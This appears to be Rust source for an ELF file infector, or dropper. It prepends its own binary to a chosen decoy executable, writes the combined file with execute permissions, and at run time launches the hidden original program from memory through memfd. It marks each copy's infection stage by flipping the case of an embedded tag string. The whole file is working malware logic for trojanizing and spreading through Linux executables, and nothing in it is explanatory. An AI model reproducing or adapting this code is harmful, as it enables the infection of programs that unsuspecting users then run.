use clap::Parser;
use memfd_exec::MemFdExecutable;
use std::env::{args, current_exe, vars};
use std::fs::{File, read};
use std::io::{Read, Write};
use std::os::unix::fs::PermissionsExt;

#[derive(Parser, Debug)]
struct Args {
    decoy_path: String,
    output_path: String,
}

const TAG: &str = "viktor var her.";

pub enum InfectionStatus {
    Infected,
    Dropper,
    Origin,
}

pub fn create_dropper() -> Result<(), Box<dyn std::error::Error>> {
    let args = Args::parse();

    let decoy_path = &args.decoy_path;
    let output_path = &args.output_path;
    assert!(is_elf(decoy_path));

    let mut destination_file = File::create(output_path)?;

    let own_path = current_exe()?;
    let mut own_contents: Vec<u8> = read(own_path)?;
    set_dropper_tag(&mut own_contents);

    let payload_length: [u8; 8] = own_contents.len().to_le_bytes();
    let decoy_contents: Vec<u8> = read(decoy_path)?;

    destination_file.write_all(&own_contents)?;
    destination_file.write_all(&decoy_contents)?;
    destination_file.write_all(&payload_length)?;
    destination_file.set_permissions(PermissionsExt::from_mode(0o755))?;

    Ok(())
}

pub fn drop_payload() -> Result<(), Box<dyn std::error::Error>> {
    let args = Args::parse();
    let decoy_path = &args.decoy_path;
    let output_path = &args.output_path;
    assert!(is_elf(decoy_path));

    let mut own_contents: Vec<u8> = read(current_exe()?)?;
    let payload_length_offset = own_contents.len() - size_of::<usize>();
    let payload_length_bytes = own_contents[payload_length_offset..].try_into()?;
    let payload_length = usize::from_le_bytes(payload_length_bytes);
    let own_contents_truncated = &mut own_contents[0..payload_length];
    set_infected_tag(own_contents_truncated);

    let mut destination_file = File::create(output_path)?;

    let decoy_contents: Vec<u8> = read(decoy_path)?;

    destination_file.write_all(own_contents_truncated)?;
    destination_file.write_all(&decoy_contents)?;
    destination_file.write_all(&payload_length_bytes)?;
    destination_file.set_permissions(PermissionsExt::from_mode(0o755))?;

    spawn_infected_program()
}

pub fn spawn_infected_program() -> Result<(), Box<dyn std::error::Error>> {
    let own_path = current_exe()?;
    let own_contents: Vec<u8> = read(own_path)?;

    let binary_size = own_contents.len();
    let payload_length_offset = binary_size - 8;
    let payload_length = usize::from_le_bytes(own_contents[payload_length_offset..].try_into()?);
    let real_binary_start = payload_length;
    let real_binary_end = payload_length_offset;
    let executable = &own_contents[real_binary_start..real_binary_end];

    let argv: Vec<String> = args().collect();
    let env: Vec<(String, String)> = vars().collect();
    let _ = MemFdExecutable::new(&argv[0], executable)
        .envs(env)
        .args(&argv[1..])
        .spawn();
    Ok(())
}

pub fn get_own_infection_status() -> InfectionStatus {
    let own_path = current_exe().expect("Failed to find my own path...");
    let own_contents = read(&own_path).expect("Failed to open myself...");

    let infect_tag_str = TAG.to_uppercase();
    let infect_tag = infect_tag_str.as_bytes();

    let dropper_tag_str = make_first_letter_uppercase(TAG);
    let dropper_tag = dropper_tag_str.as_bytes();

    if is_tag_in_file_buffer(infect_tag, &own_contents) {
        InfectionStatus::Infected
    } else if is_tag_in_file_buffer(dropper_tag, &own_contents) {
        InfectionStatus::Dropper
    } else {
        InfectionStatus::Origin
    }
}

fn is_tag_in_file_buffer(tag: &[u8], file_buffer: &[u8]) -> bool {
    let tag_len = tag.len();
    file_buffer
        .windows(tag_len)
        .any(|window| window == tag)
}

fn make_first_letter_uppercase(lower_string: &str) -> String {
    let mut chars = lower_string.chars();
    match chars.next() {
        Some(c) => c.to_uppercase().chain(chars).collect(),
        None => String::new(),
    }
}

fn set_infected_tag(file_contents: &mut [u8]) {
    let tag_bytes: &[u8] = TAG.as_bytes();
    let tag_len = tag_bytes.len();
    if let Some(tag_index) = file_contents
        .windows(tag_len)
        .position(|window| window == tag_bytes)
    {
        for byte in file_contents[tag_index..tag_index + tag_len].iter_mut() {
            if 97 <= *byte && *byte <= 122 {
                *byte ^= 0x20;
            }
        }
    } else {
        panic!("Could not find tag in myself!");
    }
}

fn set_dropper_tag(file_contents: &mut [u8]) {
    let tag_bytes: &[u8] = TAG.as_bytes();
    let tag_len = tag_bytes.len();
    if let Some(tag_index) = file_contents
        .windows(tag_len)
        .position(|window| window == tag_bytes)
    {
        file_contents[tag_index] ^= 0x20;
    } else {
        panic!("Could not find tag in myself!");
    }
}

fn is_elf(file_path: &str) -> bool {
    let elf_magic_number = [0x7f, 0x45, 0x4c, 0x46];
    let mut magic_number = [0; 4];

    let mut suspect_file = File::open(file_path).expect("Failed to open file when scanning.");
    let _ = suspect_file
        .read(&mut magic_number)
        .expect("Failed to read file");

    elf_magic_number == magic_number
}
